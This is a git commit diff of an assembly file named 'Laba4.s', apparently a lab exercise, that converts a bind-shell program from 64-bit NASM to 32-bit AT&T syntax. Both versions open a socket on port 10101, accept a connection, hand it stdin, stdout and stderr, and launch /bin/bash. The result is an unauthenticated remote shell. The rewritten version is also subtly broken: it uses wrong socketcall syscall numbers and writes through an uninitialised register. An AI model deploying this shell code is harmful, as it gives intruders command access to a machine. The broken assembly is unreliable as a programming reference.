fa169032c7da7592ac5fb3da5f401f3524b1778b
Хімін Роман <125272724+karasu000@users.noreply.github.com>
2024-04-28 16:55:51 +0300

    Update Laba4.s

--- Laba4.s
+++ Laba4.s
@@ -1,71 +1,88 @@
-section .bss
-    sin resb 16
-    sock resd 1
-    fd resd 1
+.section .bss
+    sin:
+        .long 0
+        .long 0
+        .long 0
+    sock:
+        .long 0
+    fd:
+        .long 0
 
-section .data
-    bash db "/bin/bash", 0
+.section .data
+    bash:
+        .string "/bin/bash"
 
-section .text
-    global _start
-
+.section .text
+.global _start
 _start:
-    ; Create socket
-    mov rax, 41         ; syscall number for socket()
-    mov rdi, 2          ; AF_INET
-    mov rsi, 1          ; SOCK_STREAM
-    xor rdx, rdx        ; IPPROTO_TCP
-    syscall
-    mov dword [sock], eax
+    /* Create socket */
+    mov $1, %eax             /* sys_socketcall */
+    mov $1, %ebx             /* socket */
+    mov $2, %ecx             /* AF_INET */
+    mov $1, %edx             /* SOCK_STREAM */
+    int $0x80                /* syscall */
 
-    ; Set up address structure
-    mov qword rdi, sin
-    mov word [rdi], 2   ; AF_INET
-    mov word [rdi + 2], 0x7527  ; Port 10101 in network byte order
-    mov dword [rdi + 4], 0       ; INADDR_ANY
-    mov rdx, 16         ; length
-    ; Bind socket
-    mov rax, 49         ; syscall number for bind()
-    mov rsi, rdi        ; pointer to sockaddr_in structure
-    mov rdx, 16         ; size of sockaddr_in structure
-    syscall
+    /* Store socket descriptor */
+    mov %eax, sock
 
-    ; Listen for connections
-    mov rax, 50         ; syscall number for listen()
-    mov rdi, dword [sock]
-    mov rsi, 1          ; backlog
-    syscall
+    /* Prepare sockaddr_in structure */
+    mov $0x2, %ax            /* AF_INET */
+    mov %ax, (%esi)          /* sin_family */
+    mov $0x7527, %ax         /* port 10101 */
+    push %ax
+    mov %sp, %ebx
+    mov %ebx, 2(%esi)        /* sin_port */
 
-    ; Accept connection
-    mov rax, 43         ; syscall number for accept()
-    mov rdi, dword [sock]
-    xor rsi, rsi        ; sockaddr pointer (NULL)
-    xor rdx, rdx        ; sockaddr length pointer (NULL)
-    syscall
-    mov dword [fd], eax
+    /* Bind */
+    mov $2, %eax             /* sys_socketcall */
+    mov $2, %ebx             /* bind */
+    lea sin, %ecx            /* pointer to sockaddr_in */
+    mov $16, %edx            /* sizeof(struct sockaddr_in) */
+    int $0x80                /* syscall */
 
-    ; Redirect stdin, stdout, stderr to the socket
-    mov rsi, eax
-    xor rdi, rdi        ; stdin (0)
-    mov rax, 33         ; syscall number for dup2()
-    syscall
+    /* Listen */
+    mov $2, %eax             /* sys_socketcall */
+    mov $4, %ebx             /* listen */
+    mov sock, %ecx           /* sockfd */
+    mov $1, %edx             /* backlog */
+    int $0x80                /* syscall */
 
-    mov rsi, eax
-    mov rdi, 1          ; stdout (1)
-    syscall
+    /* Accept */
+    mov $2, %eax             /* sys_socketcall */
+    mov $5, %ebx             /* accept */
+    mov sock, %ecx           /* sockfd */
+    push $0                  /* addr */
+    push $0
+    push $0
+    lea (%esp), %ecx         /* struct sockaddr_in *addr */
+    push $16                 /* addrlen */
+    push %ecx
+    mov %esp, %ecx
+    int $0x80                /* syscall */
 
-    mov rsi, eax
-    mov rdi, 2          ; stderr (2)
-    syscall
+    /* Store accepted socket descriptor */
+    mov %eax, fd
 
-    ; Execute /bin/bash
-    mov rdi, bash
-    mov rax, 59         ; syscall number for execve()
-    xor rsi, rsi        ; no arguments
-    xor rdx, rdx        ; no environment variables
-    syscall
+    /* Redirect stdin, stdout, stderr to the accepted socket */
+    mov $63, %eax            /* sys_dup2 */
+    mov fd, %ebx             /* oldfd */
+    mov $0, %ecx             /* newfd = stdin */
+    int $0x80                /* syscall */
 
-    ; Exit
-    mov rax, 60         ; syscall number for exit()
-    xor rdi, rdi        ; exit code 0
-    syscall
+    mov $63, %eax            /* sys_dup2 */
+    mov fd, %ebx             /* oldfd */
+    mov $1, %ecx             /* newfd = stdout */
+    int $0x80                /* syscall */
+
+    mov $63, %eax            /* sys_dup2 */
+    mov fd, %ebx             /* oldfd */
+    mov $2, %ecx             /* newfd = stderr */
+    int $0x80                /* syscall */
+
+    /* Execute /bin/bash */
+    mov $11, %eax            /* sys_execve */
+    lea bash, %ebx           /* filename */
+    xor %ecx, %ecx           /* argv = NULL */
+    xor %edx, %edx           /* envp = NULL */
+    int $0x80                /* syscall */
+
